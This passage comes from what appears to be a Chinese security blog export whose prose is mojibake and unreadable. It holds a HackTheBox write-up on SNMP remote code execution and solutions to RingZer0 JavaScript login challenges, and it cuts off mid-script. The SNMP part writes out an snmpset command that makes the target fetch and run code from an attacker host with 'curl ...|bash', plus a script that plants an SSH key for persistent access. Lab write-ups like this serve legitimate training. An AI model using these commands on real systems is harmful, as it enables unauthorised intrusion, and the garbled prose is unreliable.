çœ‹åˆ°è¿™ä¸ªudpæˆ‘å°±ä¼°è®¡ä¸å¦™ï¼Œè‡ªå·±æ¢æµ‹ç«¯å£æ—¶è‚¯å®šåˆå¿˜è®°æ‰«udpäº†ã€‚è€Œä¸”ä»è¿™ä¸ªsnmp.confä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®ç»„SuP3RPrivCom90å±äºrwcommunityæœ‰ç€è¯»å†™æƒé™ã€‚äºæ˜¯æˆ‘å»æœç´¢äº†ä¸‹snmpç›¸å…³æ¼æ´,å‘ç°çœŸçš„å¯ä»¥è¾¾æˆgetshell å…ˆnmapæ‰«ä¸‹ç¡®è®¤ 12345678910111213141516# Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195Nmap scan report for 10.10.10.195Host is up (0.43s latency).Not shown: 999 closed portsPORT STATE SERVICE161/udp open snmp| snmp-info: | enterprise: net-snmp| engineIDFormat: unknown| engineIDData: f20383648c26d05d00000000| snmpEngineBoots: 603|_ snmpEngineTime: 10h34m03s| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64|_ System uptime: 10h34m3.40s (3804340 timeticks)# Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds æœç„¶é…ç½®ä¸æ˜¯localhost:161çš„è¯æˆ‘ä»¬æ˜¯å¯ä»¥å¤–ç½‘ç›´æ¥è®¿é—®çš„ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®ç½‘ä¸Šçš„æ–‡ç« è¿›è¡Œäº†è§£äº†ã€‚https://digi.ninja/blog/snmp_to_shell.php éœ€è¦æ³¨æ„çš„æ˜¯ã€‚è¦æ˜¯å‡ºç°äº†è·Ÿæ–‡ç« ä¸­ä¸€å¼€å§‹ä¸€æ ·çš„æŠ¥é”™,éœ€è¦æŒ‰ç…§è¿™ç¯‡ æ–‡ç« è¿›è¡Œç›¸å…³ä¸‹è½½ã€‚æˆ‘çš„kalié»˜è®¤ä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„,éœ€è¦ä¸‹è½½é¢å¤–çš„ä¾èµ–å¹¶ä¿®æ”¹é…ç½®ã€‚ æˆåŠŸè¿è¡Œsnmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1çš„è¯æ˜¯è¿™æ ·çš„ ä»æ–‡ç« ä¸­äº†è§£åˆ°,å¦‚æœç›´æ¥ä¿®æ”¹confæ–‡ä»¶,æ˜¯å¯ä»¥åˆ©ç”¨extend è¿™ä¸€éƒ¨åˆ†å¯æ‰§è¡Œå‘½ä»¤çš„ç‰¹ç‚¹æ¥è¿›è¡Œæ¶æ„å‘½ä»¤çš„æ’å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åœ¨è¿œç¨‹,è¿˜æœ‰æ–¹æ³•å¯ä»¥ç›´æ¥ä¿®æ”¹æˆ–è€…æ’å…¥åä»¤å—ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚æˆ‘å¾ˆå¿«æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ã€‚ https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/ ç¨å¾®è°ƒç”¨ä¸‹nsExtendObjectsã€‚ä¼šå‘ç°å®ƒä¼šæŠŠextendé‡Œçš„å‘½ä»¤éƒ½æ‰§è¡Œä¸€å›ã€‚ 12345root@byc404:~# snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsNET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6NET-SNMP-EXTEND-MIB::nsExtendCommand.\"test\" = STRING: /bin/bashNET-SNMP-EXTEND-MIB::nsExtendCommand.\"test1\" = STRING: /bin/echoNET-SNMP-EXTEND-MIB::nsExtendCommand.\"test2\" = STRING: echoè¿™é‡Œtestæœ¬æ¥ä¸åº”è¯¥å­˜åœ¨çš„ã€‚åº”è¯¥æ˜¯å…¶ä»–äººåˆ›å»ºäº†è¿™ä¸ªå˜é‡ã€‚è€Œå®ƒæ˜¯/bin/.bashè°ƒç”¨çš„ã€‚æ‰€ä»¥æˆ‘ç›´æ¥æ‹¿æ¥ä¿®æ”¹å€¼ 123snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendArgs.\"test\"' = '-c \"curl 10.10.14.87|bash\"'snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects getshell è¿™é‡Œæˆ‘ç¬¬ä¸€æ¬¡è¯•æˆåŠŸäº†,åæ¥å› ä¸ºpwnä¸ä¼šå°±é€€å‡ºäº†ã€‚ç­‰ç¬¬äºŒå¤©å†å°è¯•åŒæ ·çš„æ–¹æ³•getshellå´å‘ç°æ€»æ˜¯è¿”å›timeoutã€‚æ¢äº†vpnåä¸è¿”å›timeoutå´æ‰§è¡Œä¸äº†curlå‘½ä»¤äº†â€¦â€¦æ€€ç–‘æ˜¯curlçš„timeoutæœ‰5så·¦å³è¾¾åˆ°äº†snmptimeoutçš„ä¸Šé™ï¼Œæ‰€ä»¥æ‰§è¡Œä¸äº†curl.äºæ˜¯æ¢äº†ä¸€ä¸ªæ€è·¯ã€‚æˆ‘ä»¬æ€»å½’æ˜¯è¦é€šè¿‡è®¿é—®é¶æœºçš„5001æ¥pwnåˆ°rootçš„ã€‚é‚£ç›´æ¥å†™sshå…¬é’¥ç„¶åç«¯å£è½¬å‘ä¹Ÿå¯ä»¥ã€‚ ç´¢æ€§å†™ä¸ªsh 12345678910#!/bin/bashssh-keygen -f ./intense -q -N \"\"key=$(cat intense.pub)snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \\ \"nsExtendStatus.\\\"test\\\"\" = createAndGo \\ \"nsExtendCommand.\\\"test\\\"\" = /bin/bash \\ \"nsExtendArgs.\\\"test\\\"\" = \"-c \\\"echo $&#123;key&#125; &gt;&gt; ~/.ssh/authorized_keys\\\"\"snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense è¿™æ ·æ•´ä½“æ‰§è¡Œèµ·æ¥ä¸ä¼šå› ä¸ºè¿ç»­çš„timeoutå¯¼è‡´æ‰‹æ•²å¤ªå¤šä»£ç ã€‚ privesc to rootå› ä¸ºä¸ä¼šæ‰€ä»¥æ‹œæ‰˜åˆ«äººäº†ã€‚ä¸€ä¸ªä¿æŠ¤å…¨å¼€çš„æ ˆæº¢å‡ºã€‚æ¶‰åŠåˆ°ä¸€äº›socketçŸ¥è¯†ã€‚å…·ä½“å°±å‚è€ƒjaubertçš„è®°å½•äº† https://jaubert.gitee.io/crackme/ è¿œç¨‹æ‰“é€š summaryæ•´ä½“ä¸Šå‰é¢æˆ‘è§‰å¾—ä¸ç®—éš¾ã€‚snmapç®—æ˜¯æ–°çŸ¥è¯†ã€‚æŒºæœ‰æ„æ€çš„ã€‚pwnçš„éƒ¨åˆ†ç›´æ¥è‡ªé—­ã€‚çœ‹æ¥ä»¥åä¹Ÿè¦å¼€å§‹å­¦ä¸‹cryè·Ÿpwnäº†â€¦â€¦","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]},{"title":"RingZer0-CTF JavascriptChallenge","slug":"Â–RingZer0-CTF-JavascriptChallenge","date":"2020-07-22T03:27:17.000Z","updated":"2021-02-18T05:09:46.303Z","comments":true,"path":"2020/07/22/Â–RingZer0-CTF-JavascriptChallenge/","link":"","permalink":"https://www.bycsec.top/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/","excerpt":"åœ¨ç½‘ä¸Šæ— æ„é—´çœ‹è§ä¸€ä¸ªCTF è§£é¢˜å¹³å°ï¼Œæ„Ÿè§‰é‡Œé¢çš„åˆ†ç±»è¿˜æŒºæœ‰æ„æ€çš„ã€‚äºæ˜¯æŒ‘äº†ä¸€ä¸ªjavascript challengeæ¥åšä¸€ä¸‹ã€‚æœ€è¿‘åšé¢˜æ—¶ç»å¸¸æ„Ÿæ…¨jsçš„å¾ˆå¤šå¼±ç±»å‹ç‰¹æ€§è¿œæ¯”phpä¸°å¯Œçš„å¤šäº†ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šç®€å•æ¥è§¦ä¸‹jsçš„é­”é¬¼ä»£ç ","text":"åœ¨ç½‘ä¸Šæ— æ„é—´çœ‹è§ä¸€ä¸ªCTF è§£é¢˜å¹³å°ï¼Œæ„Ÿè§‰é‡Œé¢çš„åˆ†ç±»è¿˜æŒºæœ‰æ„æ€çš„ã€‚äºæ˜¯æŒ‘äº†ä¸€ä¸ªjavascript challengeæ¥åšä¸€ä¸‹ã€‚æœ€è¿‘åšé¢˜æ—¶ç»å¸¸æ„Ÿæ…¨jsçš„å¾ˆå¤šå¼±ç±»å‹ç‰¹æ€§è¿œæ¯”phpä¸°å¯Œçš„å¤šäº†ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šç®€å•æ¥è§¦ä¸‹jsçš„é­”é¬¼ä»£ç  0x01é¦–å…ˆjsç±»å‹çš„é¢˜ç›®å¿…ç„¶æ˜¯åœ¨é™æ€é¡µé¢å°±å¯ä»¥æ‰¾åˆ°æºç çš„ã€‚æœ‰æ—¶ä¼šåŠ æ··æ·†ï¼Œä½†æ··æ·†çš„æœºç†å…¶å®åŸºæœ¬ä¸Šéƒ½æŒºä¸€èˆ¬çš„ã€‚è¿™é‡Œç›´æ¥æŸ¥çœ‹é¡µé¢æºç  12345678910111213// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault() var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); if(u == \"admin\" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;); å‘ç°ä¸€ä¸ªç”¨æˆ·å¯†ç çš„åˆ¤æ–­ã€‚æˆåŠŸç™»é™†å³å¯å®Œæˆäº‹ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠå¯†ç æ‰”è¿›consoleè½¬æ¢å¾—åˆ°JavaScriptIsSecure.ç™»é™†æ‹¿flag. 0x02123456789101112// Look's like weak JavaScript auth script :) $(\".c_submit\").click(function(event) &#123; event.preventDefault(); var p = $(\"#cpass\").val(); if(Sha1.hash(p) == \"b89356ff6151527e89c4f3e3d30c8e6586c63962\") &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;); è¿™é‡Œç›´æ¥ç”¨æ˜ç¡®çš„ç®—æ³•å¯¹å¯†ç è¿›è¡ŒåŠ å¯†ç„¶åä¸hashå€¼è¿›è¡Œæ¯”è¾ƒã€‚ä¸è¿‡æ³¨æ„çš„æ˜¯phpé‡Œå¸¸è§çš„0ä¸0eçš„å¼±ç±»å‹æ¯”è¾ƒåœ¨jsä¸­æ˜¯ä¸ä¼šå‡ºç°çš„ï¼ˆä½†æ˜¯å¯èƒ½ä¼šå‡ºç°å…¶ä»–å¼±ç±»å‹é—®é¢˜ï¼‰ æ‰€ä»¥ç›´æ¥å»ç½‘ä¸Šæ‰¾å¾—åˆ°adminzå¼±å¯†ç ã€‚ 0x03ä¸€ä¸ªå…¸å‹çš„æ··æ·†ã€‚åŒæ ·ä¹Ÿæ˜¯å…¸å‹çš„è§£æ³•ã€‚ 1var _0xc360=[\"\\x76\\x61\\x6C\",\"\\x23\\x63\\x70\\x61\\x73\\x73\",\"\\x61\\x6C\\x6B\\x33\",\"\\x30\\x32\\x6C\\x31\",\"\\x3F\\x70\\x3D\",\"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\",\"\\x68\\x72\\x65\\x66\",\"\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\",\"\\x3C\\x64\\x69\\x76\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x27\\x65\\x72\\x72\\x6F\\x72\\x27\\x3E\\x57\\x72\\x6F\\x6E\\x67\\x20\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x20\\x73\\x6F\\x72\\x72\\x79\\x2E\\x3C\\x2F\\x64\\x69\\x76\\x3E\",\"\\x68\\x74\\x6D\\x6C\",\"\\x23\\x63\\x72\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x2E\\x63\\x5F\\x73\\x75\\x62\\x6D\\x69\\x74\"];$(_0xc360[12])[_0xc360[11]](function ()&#123;var _0xf382x1=$(_0xc360[1])[_0xc360[0]]();var _0xf382x2=_0xc360[2];if(_0xf382x1==_0xc360[3]+_0xf382x2)&#123;if(document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4])==-1)&#123;document[_0xc360[7]]=document[_0xc360[7]][_0xc360[6]]+_0xc360[4]+_0xf382x1;&#125; ;&#125; else &#123;$(_0xc360[10])[_0xc360[9]](_0xc360[8]);&#125; ;&#125; ); æˆ‘ä¸ªäººä¹ æƒ¯æ˜¯ç”¨è¿™ä¸ªç½‘ç«™å…ˆå»ä¸€å±‚æ··æ·†ã€‚ç„¶åå†æ¥çœ‹æºç  123456789101112var _0xc360 = [\"val\", \"#cpass\", \"alk3\", \"02l1\", \"?p=\", \"indexOf\", \"href\", \"location\", \"&lt;div class=\\'error\\'&gt;Wrong password sorry.&lt;/div&gt;\", \"html\", \"#cresponse\", \"click\", \".c_submit\"];$(_0xc360[12])[_0xc360[11]](function () &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); å…¶å®è¿˜å¯ä»¥è¿›ä¸€æ­¥å»æ··æ·†ã€‚ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°å¤ªå¥½çš„ç½‘ç«™ã€‚æ‰€ä»¥é€‰æ‹©ç›´æ¥çœ‹ã€‚ä¸éš¾å‘ç°ifè¯­å¥åŠå‰é¢ä¸€è¡Œçš„å†…å®¹æ˜¯var _0xf382x2 = &#39;alk3&#39;; if(_0xf382x1 == &#39;02l1&#39; + _0xf382x2 ) å¾ˆæ¸…æ™°çš„è¡¨æ˜äº†éªŒè¯æ–¹å¼åŠå¯†ç 02l1alk3 0x0412345678910111213141516171819202122$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var k = CryptoJS.SHA256(\"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\"); var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); var t = true; if(u == \"\\x68\\x34\\x78\\x30\\x72\") &#123; if(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(0,32)), &#123; iv: CryptoJS.enc.Hex.parse(k.toString().substring(32,64)) &#125;) == \"ob1xQz5ms9hRkPTx+ZHbVg==\") &#123; t = false; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125;&#125;); è¿™é‡Œå°±å¼€å§‹ä½¿ç”¨äº†ç®—æ³•è¿›è¡Œå¤„ç†äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ã€‚useråªåšäº†ä¸€ä¸ª16è¿›åˆ¶çš„ç®€å•æ˜¾ç¤ºé¿å…ç›´è§‚ã€‚è€Œpassåœ¨ivå·²çŸ¥çš„æƒ…å†µä¸‹è¿›è¡Œaesç®—æ³•çš„å¯†æ–‡æ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è§£å‡ºpass. å†™ä¸ªnodeè„šæœ¬è½¬æ¢ä¸‹å¯†ç  123456789101112131415161718const cryptojs = require(\"crypto-js\");let k = cryptojs.SHA256(\"\\x93\\x39\\x02\\x49\\x83\\x02\\x82\\xf3\\x23\\xf8\\xd3\\x13\\x37\");let key = cryptojs.enc.Hex.parse(k.toString().substring(0,32));let iv = cryptojs.enc.Hex.parse(k.toString().substring(32,64));let encrypted = \"ob1xQz5ms9hRkPTx+ZHbVg==\";let p =cryptojs.AES.decrypt(encrypted,key,&#123;iv:iv&#125;);(function hex_to_ascii(str1) &#123; var hex = str1.toString(); var str = ''; for (var n = 0; n &lt; hex.length; n += 2) &#123; str += String.fromCharCode(parseInt(hex.substr(n, 2), 16)); &#125; console.log(str); &#125; )(p); è¿è¡Œå¾—åˆ°åŠ ä¸Šç”¨æˆ·åæ‰”è¿›consoleå…¶å®å°±æ˜¯h4x0rã€‚æ‰€ä»¥å³å¯ç™»å½•æ‹¿flag. 0x05123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;;&#125;function callback(x,y,i,a) &#123; return !y.call(x, a[a[\"length\"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;;&#125;var ref = &#123;T : \"BG8\",J : \"jep\",j : \"M2L\",K : \"L23\",H : \"r1A\"&#125;;function validatekey()&#123; e = false; var _strKey = \"\"; try &#123; _strKey = document.getElementById(\"key\").value; var a = _strKey.split(\"-\"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + _strKey; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125; &#125;function equal(o,o1)&#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true;&#125;function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;;&#125;var h = curry(hook);var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function(\"a\",\"b\",\"return a &amp;&amp; b;\"));function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), \"this.\" + _part[3] + \"=\" + _part.slice(1,3) + \"+\" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : \"'\"+ _part[0] + \"'\"));&#125; è¿™é¢˜å¼€å§‹éš¾åº¦å°±ä¸Šå‡äº†ã€‚æˆ‘ä»¬å…ˆæ…¢æ…¢å®¡è®¡ä»£ç ã€‚ 123456789101112131415161718192021222324252627function validatekey()&#123; e = false; var _strKey = \"\"; try &#123; _strKey = document.getElementById(\"key\").value; var a = _strKey.split(\"-\"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + _strKey; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125; &#125; è¿™é‡Œå–äº†é¡µé¢ä¸­keyå€¼ï¼ˆå³è¾“å…¥ï¼‰è¿›è¡Œä¸€ç³»åˆ—åˆ¤æ–­ã€‚åªæœ‰eä¸ºfalseæ—¶æˆ‘ä»¬æ‰èƒ½è¿›å…¥document.location = document.location.href + &quot;?p=&quot; + _strKey; æ³¨æ„åˆ°å…¶ä¸­ä¸»è¦è¦æ±‚æ˜¯var a = _strKey.split(&quot;-&quot;); if(a.length !== 5)...... æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ ¼å¼ä¸ºxxx-xxx-xxx-xxx-xxxçš„key. æ¥ä¸‹æ¥çœ‹å…¶ä»–å‡½æ•°ã€‚è¿™é‡Œçš„curry()æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„jsæŸ¯é‡ŒåŒ–çš„å‡½æ•°( ä¸ºä»€ä¹ˆä¸æ˜¯åº“é‡Œ233) ã€‚å¸¸ç”¨äºå¤šå‚å‡½æ•°å¤ç”¨å¹¶ä¸”ä¸callbackç›¸ç»“åˆã€‚ä¸è¿‡æˆ‘ä»¬ä¸å¿…æ·±ç©¶,å…ˆæ¥çœ‹é€»è¾‘ã€‚ 12var h = curry(hook);var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function(\"a\",\"b\",\"return a &amp;&amp; b;\")); é¦–å…ˆæ˜¯è¿™é‡Œã€‚å‡ºç°äº†ä¸€ä¸ªx&gt;=48ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“xå‚æ•°ä»å“ªé‡Œæ¥ã€‚æ‰€ä»¥ç»§ç»­å‘ä¸‹çœ‹ 1return new Function(_part.substring(1,3), \"this.\" + _part[3] + \"=\" + _part.slice(1,3) + \"+\" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : \"'\"+ _part[0] + \"'\")); (fn(function(y){return y&lt;=57})(_part.charCodeAt(0)) ? _part[0] : &quot;&#39;&quot;+ _part[0] + &quot;&#39;&quot;)è¿™ä¸€éƒ¨åˆ†è¯´æ˜å…¶è¿”å›çš„æ˜¯å‡½æ•°è¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚çœ‹åˆ°è¿™ä¸ªIIFEçš„è°ƒç”¨ä»¥åŠå‰é¢æˆ‘ä»¬fnå‡½æ•°çš„æ„é€ ã€‚å¯ä»¥å¾—å‡ºï¼Œè¿™é‡Œå¯¹æˆ‘ä»¬è¾“å…¥çš„ç¬¬1ä¸ªå­—ç¬¦è¿›è¡Œäº†æ¯”è¾ƒï¼Œå…¶asciiå€¼åº”è¯¥åœ¨48åˆ°57ä¹‹é—´ï¼ˆå³æ•°å­—ï¼‰å°±ç›´æ¥å–æ•°å­—ï¼Œå¦åˆ™å°±åŠ ä¸Š&#39;&#39; ç®€å•çš„è°ƒç”¨ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ¥è€Œè¿™ä¸ªæ•´ä½“æ˜¯ä¸_part.substring(1,3)ä½œä¸ºå‚æ•°è¢«é€è¿›æ„é€ å‡½æ•°çš„ã€‚å‘ç°ä»–æ˜¯åœ¨keyçš„æ£€æŸ¥é‡Œè¢«è°ƒç”¨äº†var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function));æˆ‘ä»¬å›å¤´çœ‹ä¸‹callbackå‡½æ•°çš„å®šä¹‰ä»¥åŠreduceRightå‡½æ•°çš„åŠŸèƒ½ 12345function callback(x,y,i,a) &#123; return !y.call(x, a[a[\"length\"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;;&#125;reduceRight() æ–¹æ³•æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºç´¯åŠ å™¨ï¼ˆaccumulatorï¼‰å’Œæ•°ç»„çš„æ¯ä¸ªå€¼ï¼ˆä»å³åˆ°å·¦ï¼‰å°†å…¶å‡å°‘ä¸ºå•ä¸ªå€¼ã€‚ https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/ReduceRightå‚è€ƒä¸Šé¢çš„æ–‡æ¡£æˆ‘ä»¬çŸ¥é“ï¼Œcallbackä½œä¸ºå›è°ƒå‡½æ•°ï¼Œç”¨äºæ“ä½œæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„a[4]ç”Ÿæˆçš„å‡½æ•°æ˜¯æ•°ç»„æœ€å³çš„èµ·ç‚¹ã€‚ä¹‹åä¾æ¬¡å‘å·¦è¿›è¡Œå¤„ç†ã€‚ è¿™é‡Œæˆ‘å°½é‡ä½œå®Œæ•´çš„è§£é‡Šã€‚é¦–å…ˆcallbackä¸­a[&quot;length&quot;]-1-iå¯¹åº”çš„æ˜¯a.length-1-iå³5-1-i=4-i.ç„¶åcallbackå‡½æ•°çš„å››ä¸ªå‚æ•°åˆ†åˆ«å¯¹åº”äº†ç©ºmapï¼Œæ„é€ å‡½æ•°ï¼Œå åŠ å™¨çš„è¶Ÿæ•°ï¼Œä»¥åŠè¢«å¤„ç†è¿‡çš„è¾“å…¥aï¼ˆä»xxxx-xxxx-xxxx-xxxx-xxxx å˜æˆä¸€ä¸ª5å…ƒç´ çš„æ•°ç»„ï¼‰æˆ‘ä»¬ç®€å•è°ƒç”¨ä¸‹,ä¼šå‘ç°æœ€ç»ˆè¿”å›çš„ç»“æœä¸­æ¯ä¸ªæ•°ç»„å…ƒç´ çš„ç¬¬äºŒï¼Œä¸‰ä¸ªä¼šä¸å˜ï¼Œå¹¶å˜æˆæ–°çš„mapä¸­å¯¹åº”å€¼çš„ç¬¬ä¸€äºŒä½ã€‚ç„¶åå€¼çš„æœ€åä¸€ä½ä¼šå˜æˆåŸæ¥è¾“å…¥æ•°ç»„çš„é€†åºç¬¬ä¸€ä½çš„ç¬¬ä¸€ä¸ªå­—æ¯ã€‚è€Œæ•´ä¸ªè¿”å›çš„mapé”®åæ˜¯åŸè¾“å…¥æ•°ç»„é€†åºçš„æœ€åä¸€ä¸ªå­—æ¯ã€‚ å¤šè¯´æ— ç›Šã€‚æˆ‘ä»¬ç”¨ä¸€ä¸ªå››å…ƒç´ çš„æ•°ç»„æ¥çœ‹çœ‹è¿”å›ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œè¿”å›çš„mapè¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ é”®åæ¥è‡ªåŸæ¥æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ mnopçš„æœ€åä¸€ä¸ªå­—æ¯ã€‚å€¼éƒ¨åˆ†bcä¿æŒä¸å˜ï¼Œæœ€åä¸€ä¸ªå­—æ¯åˆ™æ˜¯mnopçš„ç¬¬ä¸€ä¸ªå­—æ¯m. æ—¢ç„¶æˆ‘ä»¬éœ€è¦æ»¡è¶³è¾“å…¥keyå¤„ç†åä¸º{T : &quot;BG8&quot;,J : &quot;jep&quot;,j : &quot;M2L&quot;,K : &quot;L23&quot;,H : &quot;r1A&quot;}; å†™ä¸ªè„šæœ¬å¤„ç†ä¸‹å³å¯ 1234567891011121314var src = 'abcd-efgh-ijkl-mnop-qrst';var dst = 'tbcq-pfgm-ljki-hnoe-drsa';var key = 'TBG8-Jjep-jM2L-KL23-Hr1A';var input = key;for (i=0; i&lt;src.length; i++) &#123; p = dst.indexOf(src[i]); tmp = input.split(''); tmp[p] = key[i]; input = tmp.join('');&#125;console.log(input); å¾—åˆ°keyABGH-3jeK-LM2j-pL2J-8r1T 0x061234567891011121314151617181920212223242526// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $(\"#cuser\").val(); var p = $(\"#cpass\").val(); var t = true; if(u == \"administrator\") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; break; &#125; &#125; &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; &#125;&#125;); ç›¸æ¯”ä¸Šä¸€é¢˜ç®—æ˜¯å°èœäº†ã€‚ç”¨æˆ·è¾“å…¥å¯†ç çš„asciiä¼šä¸ç”¨æˆ·åadministratorè¿›è¡ŒåŠ æ³•è¿ç®—å¹¶ä¸å·²çŸ¥æ•°ç»„å€¼è¿›è¡Œæ¯”è¾ƒã€‚é‚£ä¹ˆé€†å†™å³å¯ 1234567891011k = [176,214,205,246,264,255,227,237,242,244,265,270,283]u = [97,100,109,105,110,105,115,116,114,97,116,111,114]p = &#123;&#125;s = \"administrator\"list1=[]for i in range(0, len(s)): p[i] = k[i] - u[i] - i*10 